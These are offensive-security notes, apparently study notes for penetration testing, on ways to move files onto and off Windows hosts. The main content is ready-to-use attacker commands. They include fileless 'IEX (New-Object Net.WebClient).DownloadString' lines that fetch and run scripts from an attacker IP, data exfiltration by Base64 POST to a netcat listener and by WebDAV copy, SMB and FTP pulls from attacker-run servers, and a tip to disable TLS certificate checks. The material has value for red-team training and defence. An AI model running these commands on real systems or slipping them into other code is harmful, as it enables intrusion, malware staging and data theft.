### Windows File Transfer Methodology

Understanding various Windows file transfer methods allows attackers to **operate stealthily** and **bypass defensive policies**. Modern threats, like the Astaroth attack, often use **fileless techniques** where payloads are downloaded via legitimate system tools and executed directly in memory to avoid detection.

---

### 1. Base64 Transfer (Non-Network Method)

Use this method when you have terminal access but **network communication is restricted** or blocked between the attack machine and the target.

**Operational Workflow:**

1. **Verify** the file's integrity on the source machine using a checksum to ensure the transfer is accurate.
2. **Encode** the file into a Base64 string.
3. **Copy-paste** the string into the target terminal.
4. **Decode** the string back into the original file format.
5. **Re-verify** the checksum on the target machine.

**Execution Commands:**

- **Linux (Source) - Encode and Checksum:**
    
    ```
    md5sum <FILENAME>
    cat <FILENAME> | base64 -w 0; echo
    ```
    
- **PowerShell (Target) - Decode and Checksum:**
    
    ```
    [IO.File]::WriteAllBytes("C:\Users\Public\<FILENAME>", [Convert]::FromBase64String("<BASE64_STRING>"))
    Get-FileHash C:\Users\Public\<FILENAME> -Algorithm md5
    ```
    

**Technical Constraints:**

- **CMD String Limit:** The Windows Command Line (`cmd.exe`) has a maximum string length of **8,191 characters**; large files may fail or require web shell alternatives.

---

### 2. PowerShell Web Downloads

Leveraging HTTP/HTTPS is effective because most environments allow outbound web traffic for productivity.

#### A. Net.WebClient Class

The `System.Net.WebClient` class is highly versatile for downloading data via HTTP, HTTPS, or FTP.

- **Download to Disk:** Use when you need the file present on the system.
    
    ```
    (New-Object Net.WebClient).DownloadFile('http://<ATTACK_IP>:<PORT>/<FILE>', '<OUTPUT_PATH>')
    ```
    
- **Fileless Execution:** Use to execute a script directly in memory, leaving **no trace on the disk**.
    
    ```
    IEX (New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>:<PORT>/<SCRIPT>.ps1')
    ```
    

#### B. Invoke-WebRequest (IWR)

Available from PowerShell 3.0+, this is slower than `WebClient` but supports aliases like `curl` and `wget`.

- **Standard Download:**
    
    ```
    Invoke-WebRequest http://<ATTACK_IP>:<PORT>/<FILE> -OutFile <OUTPUT_NAME>
    ```
    

**Edge Cases & Error Handling:**

|Condition|Solution|
|:--|:--|
|**IE First-Launch Not Complete:** Prevents parsing.|Add `-UseBasicParsing` parameter.|
|**Untrusted SSL/TLS Certificate:** Connection closed.|Set `ServerCertificateValidationCallback = {$true}`.|

---

### 3. SMB File Transfers

The SMB protocol (Port 445) is standard in Windows environments for internal file sharing.

**Operational Workflow:**

1. **Start** an SMB server on the attack machine using Impacket.
2. **Authenticate** if the target organization blocks unauthenticated guest access (common in new Windows versions).
3. **Copy** the file from the share to the local target.

**Execution Commands:**

- **Attack Machine (Start Authenticated Server):**
    
    ```
    sudo impacket-smbserver <SHARE_NAME> -smb2support <LOCAL_DIRECTORY> -user <USERNAME> -password <PASSWORD>
    ```
    
- **Target Machine (Mount and Copy):**
    
    ```
    net use n: \\<ATTACK_IP>\<SHARE_NAME> /user:<USERNAME> <PASSWORD>
    copy n:\<FILENAME>
    ```
    

---

### 4. FTP File Transfers

FTP (Ports 21/20) can be used via the native Windows FTP client or PowerShell.

**Non-Interactive Shell Workflow:** When you lack an interactive shell, use a **command file** to automate the FTP client.

```
echo open <ATTACK_IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET <FILE> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

---

### 5. WebDAV (SMB over HTTP)

Use WebDAV when **outbound SMB (TCP 445) is blocked** by the firewall. WebDAV allows the target to treat a web server like a file server over Port 80/443.

**Execution Commands:**

- **Attack Machine (Setup):**
    
    ```
    pip3 install wsgidav cheroot
    sudo wsgidav --host=0.0.0.0 --port=80 --root=<DIRECTORY> --auth=anonymous
    ```
    
- **Target Machine (Connect):** The `DavWWWRoot` keyword tells the Windows driver to connect to the root of the WebDAV server.
    
    ```
    dir \\<ATTACK_IP>\DavWWWRoot
    copy <FILE_PATH> \\<ATTACK_IP>\DavWWWRoot
    ```
    

---

### 6. Upload Operations

To exfiltrate data or move files for analysis, use these reverse techniques.

- **PowerShell Web Upload:** Requires a web server configured to accept uploads (e.g., Python `uploadserver`).
    
    ```
    # Load upload script and execute
    IEX(New-Object Net.WebClient).DownloadString('http://<ATTACK_IP>:<PORT>/PSUpload.ps1')
    Invoke-FileUpload -Uri http://<ATTACK_IP>:<PORT>/upload -File <PATH_TO_FILE>
    ```
    
- **Base64 via POST (Netcat):** Use to send a file as a POST request body to a listening `nc` instance.
    
    ```
    $b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE>' -Encoding Byte))
    Invoke-WebRequest -Uri http://<ATTACK_IP>:<PORT>/ -Method POST -Body $b64
    ```
    

---

### Summary of Command Parameters

|Tool|Parameter|Purpose|
|:--|:--|:--|
|**WMIC**|`/Format`|Allows download/execution of malicious JavaScript.|
|**pyftpdlib**|`--write`|**Essential** to allow clients to upload files to the FTP server.|
|**IWR**|`-OutFile`|Specifies the local name for the downloaded resource.|

---

### Dangerous & Misconfigured Settings

| Setting                                   | Attack Implication                                                                                                                         |
| :---------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------- |
| **Unauthenticated Guest Access**          | Allows easy file transfer via SMB without credentials; if disabled, requires `net use` with valid credentials.                             |
| **Anonymous FTP Write Access**            | If enabled (via `--write` in `pyftpdlib`), any user can upload files to the attack host, potentially leading to unauthorized data storage. |
| **Missing SMB Outbound Egress Filtering** | Allows attackers to easily exfiltrate data or pull tools via Port 445.                                                                     |